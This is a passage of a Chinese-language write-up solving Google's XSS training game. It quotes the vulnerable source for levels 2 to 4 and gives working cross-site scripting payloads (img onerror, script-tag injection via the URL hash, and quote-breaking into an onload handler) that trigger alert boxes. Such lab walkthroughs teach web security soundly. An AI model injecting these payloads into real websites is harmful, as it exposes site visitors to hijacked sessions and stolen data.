string">'&lt;table class="message"> &lt;tr> &lt;td valign=top> '</span>            <span class="token operator">+</span> <span class="token string">'&lt;img src="/static/level2_icon.png"> &lt;/td> &lt;td valign=top '</span>            <span class="token operator">+</span> <span class="token string">' class="message-container"> &lt;div class="shim">&lt;/div>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;b>You&lt;/b>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;span class="date">'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>date<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/span>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;blockquote>"</span> <span class="token operator">+</span> posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>message <span class="token operator">+</span> <span class="token string">"&lt;/blockquote"</span><span class="token punctuation">;</span> <span class="token comment">//这还少个 '>' 23333</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;/td>&lt;/tr>&lt;/table>"</span>          containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">+=</span> html<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span></code></pre><p>可以发现我们提交的内容输出字段会被<code>&lt;blockquote&gt;</code>包裹，考虑到数据是存储的服务器上的可以利用存储型xss，利用<code>onerror</code>事件来进行xss</p><blockquote><p>onerror 事件在视频/音频（audio/video）数据加载期间发生错误时触发。</p></blockquote><p>利用img标签加载一个不存在的对象，会触发onerror事件</p><p>payload：</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">""</span> onerror<span class="token operator">=</span><span class="token string">"javascript:alert(1);"</span><span class="token operator">/</span><span class="token operator">></span></code></pre><p>代码存进了服务器里，只要刷新都会触发</p><img src="/article/xss/image-20210424145306208.png" class="" title="level2-1" loading="lazy"><img src="/article/xss/image-20210424145406792.png" class="" title="level2-2" loading="lazy"><hr><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><a href="https://xss-game.appspot.com/level3/frame#1">https://xss-game.appspot.com/level3/frame#1</a></p><p>源码·index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token comment">&lt;!-- Load jQuery --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span>      <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">function</span> <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token parameter">num</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Dynamically load the appropriate image.</span>        <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">"Image "</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        html <span class="token operator">+=</span> <span class="token string">"&lt;img src='/static/level3/cloud"</span> <span class="token operator">+</span> num <span class="token operator">+</span> <span class="token string">".jpg' />"</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#tabContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>         window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">=</span> num<span class="token punctuation">;</span>         <span class="token comment">// Select the current tab</span>        <span class="token keyword">var</span> tabs <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'.tab'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> tabs<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>id <span class="token operator">==</span> <span class="token string">"tab"</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">"tab active"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">"tab"</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>         <span class="token comment">// Tell parent we've changed the tab</span>        top<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token comment">// Extra code so that we can communicate with the parent page</span>      window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>source <span class="token operator">==</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level3.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Take a tour of our cloud data center.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab1<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>chooseTab(<span class="token punctuation">'</span>1<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Image 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab2<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>chooseTab(<span class="token punctuation">'</span>2<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Image 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab3<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>chooseTab(<span class="token punctuation">'</span>3<span class="token punctuation">'</span>)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Image 3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tabContent<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>关键代码</p><pre class="language-js" data-language="js"><code class="language-js">html <span class="token operator">+=</span> <span class="token string">"&lt;img src='/static/level3/cloud"</span> <span class="token operator">+</span> num <span class="token operator">+</span> <span class="token string">".jpg' />"</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#tabContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>         window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">=</span> num<span class="token punctuation">;</span></code></pre><p><code>num</code>是#后面的输入，没有经过任何过滤，所以让它的img标签闭合，再加上我们的代码即可</p><p><code>&lt;img src=&#39;/static/level3/cloud + num + .jpg&#39; /&gt;</code></p><p>即变为<code>&lt;img src=&#39;/static/level3/cloud&#39;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;.jpg&#39; /&gt;</code></p><p>Payload：</p><pre class="language-js" data-language="js"><code class="language-js">'<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span></code></pre><img src="/article/xss/image-20210424150902973.png" class="" title="level3-1" loading="lazy"><img src="/article/xss/image-20210424150928175.png" class="" title="level3-2" loading="lazy"><hr><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p><a href="https://xss-game.appspot.com/level4/frame#">https://xss-game.appspot.com/level4/frame#</a></p><p>源码·index.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level4.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>timer<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>timer<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Create timer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Disable the reflected XSS filter for demonstration purposes</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">"X-XSS-Protection"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'timer'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment"># Show main timer page</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token comment"># Show the results page</span>      timer<span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'timer'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>      self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'timer.html'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token string">'timer'</span> <span class="token punctuation">:</span> timer <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>         <span class="token keyword">return</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Timer.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">function</span> <span class="token function">startTimer</span><span class="token punctuation">(</span><span class="token parameter">seconds</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        seconds <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>seconds<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           window<span class="token punctuation">.</span><span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"Time is up!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          window<span class="token punctuation">.</span>history<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> seconds <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level4.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/loading.gif<span class="token punctuation">"</span></span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>startTimer(<span class="token punctuation">'</span>&#123;&#123; timer &#125;&#125;<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Your timer will execute in &#123;&#123; timer &#125;&#125; seconds.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>关键代码</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/loading.gif<span class="token punctuation">"</span></span> <span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>startTimer(<span class="token punctuation">'</span>&#123;&#123; timer &#125;&#125;<span class="token punctuation">'</span>);<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><p>默认3秒<code>seconds = parseInt(seconds) || 3;</code></p><p>输入100，看到加载如下</p><p><code>&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;100&#39;);&quot;&gt;</code></p><p>于是想办法闭合，用单引号闭合<code>startTimer</code>，然后写弹窗再和后面的<code>&#39;)</code>闭合</p><blockquote><p>onload 事件会在页面或图像加载完成后立即发生</p></blockquote><p>Payload:</p><pre class="language-none"><code class="language-none">&#39;);alert(&#39;1</code></pre><p>即变为<code>&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&#39;&#39;);alert(&#39;1&#39;);&quot;&gt;</code></p><img src="/article/xss/image-20210424152557697.png" class="" title="level4-1" loading="lazy"><img src="/article/xss/image-20210424152620652.png" class="" title="level4-2" loading="lazy"><hr><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p><a href="https://xss-game.appspot.com/level5/frame#">https://xss-game.appspot.com/level5/frame#</a></p><p>源码·confirm.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span 